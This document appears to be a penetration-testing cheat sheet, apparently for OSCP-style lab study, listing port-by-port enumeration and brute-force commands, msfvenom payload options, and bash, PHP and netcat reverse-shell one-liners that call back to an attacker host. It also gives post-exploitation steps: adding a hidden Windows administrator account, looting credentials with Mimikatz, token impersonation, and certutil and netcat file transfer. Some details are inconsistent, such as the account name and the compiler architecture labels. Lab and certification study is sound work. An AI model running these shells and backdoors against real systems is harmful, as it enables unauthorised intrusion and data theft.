# 1. Enumeration
## Intital Scanning
First run an asynchronous port scan on the box to find the ports of interest.

```bash    
# Standard
unicornscan $RHOST

# Full Range
unicornscan $RHOST:0-65535
```

Second, run a slower, synchronous scans with scripts.

## Port 21 - FTP
```bash
ftp $RHOST

# Anonymous login
nmap --script=ftp-anon -p 21 $RHOST

# Bruteforce logins
nmap --script=ftp-brute -p 21 $RHOST
```

## Port 25 - SMTP
```bash
nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344, smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $RHOST
```

## Port 80 - HTTP

```bash
nikto $RHOST

curl $RHOST/robots.txt

dirbuster
```
#### Wordpress
```bash
nmap --script=http-wordpress* -p 80 $RHOST

wpscan $RHOST
```

## Port 110 - POP3
```bash
telnet $RHOST 110
    USER $USER
    PASS $PASS
    LIST
    RETR
    QUIT
```

## Port 111 - RPCBind
```bash
# List of services running RPC
# RPC can help find NFS-shares
rpcbind -p $RHOST

rpcclient -U "" $RHOST
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

## Port 135 - MSRPC
```bash
# Micro$oft RPC port
nmap 192.168.0.101 --script=msrpc-enum

rpcclient -U "" $RHOST
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

## Port 139/445 - SMB
```bash
enum4linux [-u $USER][-p $PASS] $RHOST

smbmap [-u $USER][-p $PASS] -H $RHOST

smbclient -L \\\\$RHOST\\$SHARE [-U $USER] [$PASS]

# Find NetBIOS info
nmblookup -A $RHOST

rpcclient -U "" -N $RHOST
    enumdomusers

# Info dump
nmap --script=smb-enum*.nse -p 139,445 $RHOST

# OS discovery
nmap --script=smb-os-discovery.nse -p 139,445 $RHOST

# Scan for known vulnerabilties
nmap --script=smb-vuln* -p 139,445 $RHOST
```

## Port 161 - SNMP
```bash
snmpwalk -c public -v1 $RHOST

snmpcheck -t $RHOST -c public

onesixtyone -c $NAMES_FILE -i $RHOST_FILE

snmpenum -t $RHOST
```

## Port 443 - HTTPS
```bash
nmap -sV --script=ssl-heartbleed $RHOST
```

## Port 2049 - NFS
```bash
# Enumeration
showmount -e $RHOST

# Mounting
mount $RHOST:/ /tmp/NFS
mount -t $RHOST:/ /tmp/NFS
```

## Port 5900 - VNC
```bash
vncviewer $RHOST
```

# 2. Exploitation
## MSFVenom Reverse Shell Payloads
### Generate Payloads

```bash
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT [-e $ENCODER [-i $ROUNDS]] [-b $BADCHARS] [-f $FORMAT] [-o $FILENMAE]
```

### Payloads
| Windows       |                                   |
|:--------- 	|   -----------------------------:	|
|   Staged  	| ``windows/shell/reverse_tcp`` 	|
| Stageless 	| ``windows/shell_reverse_tcp`` 	|

| Linux         |                                   |
|:--------- 	|   -----------------------------:	|
|   32bit   	| ``linux/x86/shell_reverse_tcp`` 	|
| 64bit      	| ``linux/x64/shell_reverse_tcp`` 	|

#### Encoders
``x86/shikata_ga_nai``

## Bash Reverse Shells
```bash
0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196
```
```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```

## PHP Reverse Shells
### One Liner
```php
<?php $sock = fsockopen($LHOST,$LPORT); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes) ?>
```
### File Upload
Kali File Location: `/usr/share/webshells/php/php-reverse-shell.php` <sup><sub>[[archive](files/php-reverse-shell.php)]

## Netcat Reverse Shells
### Unix
```bash
nc -e /bin/sh $LHOST $LPORT
```

### OpenBSD
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $PORT >/tmp/f
```

# 3. Post-Exploitation

## Linux
### Enumeration Scripts:
- [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) <sup><sub>[[archive](files/LinEnum.sh)]

- [linuxprivchecker.py](https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py) <sup><sub>[[archive](files/linuxprivchecker.py)]

- [unix-privesc-check.sh](https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh) <sup><sub>[[archive](files/upc.sh)]

## Windows
### Enumeration Scripts
- [windows-exploit-suggester.py](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py)  <sup><sub>[[archive](files/windows-exploit-suggester.py)]

- [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check) <sup><sub>[[archive](files/windows_privesc_check.py)]

- [Sherlock](https://github.com/rasta-mouse/Sherlock) <sup><sub>[[archive](files/Sherlock.ps1)]

### Resources
- https://guif.re/windowseop

### Creating Windows Admin Account
```bash
# Victim
net user /add jack sparrow
net localgroup administrators jack /add

# Connect with
rdesktop -u jim -p sparrow [IP-ADDRESS]
```

### Tokens
If you have admin, loot tokens & creds with [Mimikatz](https://github.com/gentilkiwi/mimikatz)

If you have a service account, and want root - try token impersonation!

- [Juicy Potato](https://github.com/ohpe/juicy-potato)
- [Churrasco](https://github.com/Re4son/Churrasco)

### Using Python Scripts without Python installed
[PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](files/PyInstaller-3.6.zip)]
```bash
pyinstaller yourprogram.py
```

### Cross-compiling for Windows

#### C & C++
```bash
# Setup
apt install mingw-w64

# x86
x86_64-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst] -lws2_32

# x64
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
```

#### C#
```bash
# Setup 
# Add repo with https://www.mono-project.com/download/stable/
sudo apt-get install mono-complete msbuild mono-roslyn

# Building
msbuild [src.sln]
```


## Exfiltration

- SSH Copy (scp)
```bash
scp user@hostname:/path/to/src user@hostname:/path/to/dst
```

- Netcat
```bash
# Victim
nc -nvlp $RPORT > out.file

# Kali
nc -nv $RHOST $RPORT < in.file
```

- exe2bat
```bash
# Convert a windows executable to a copy and paste set of commands
wine $(locate exe2bat.exe) nc.exe nc.txt
```

- certutil.exe
```bash
certutil.exe -urlcache -split -f “$URL” $FILENAME
```

- [zip.vbs](files/zip.vbs) <sup><sub>[[copy&paste](files/zip.vbs.txt)]
```bash
CScript zip.vbs $SRC $DEST
```

- [wget.vbs](files/wget.vbs) <sup><sub>[[copy&paste](files/wget.vbs.txt)]
```bash
CScript wget.vbs $SRC $DEST
```

# Resources
https://sushant747.gitbooks.io/total-oscp-guide/
https://guif.re/linuxeop
https://guif.re/windowseop
https://github.com/rafiherm/OSCP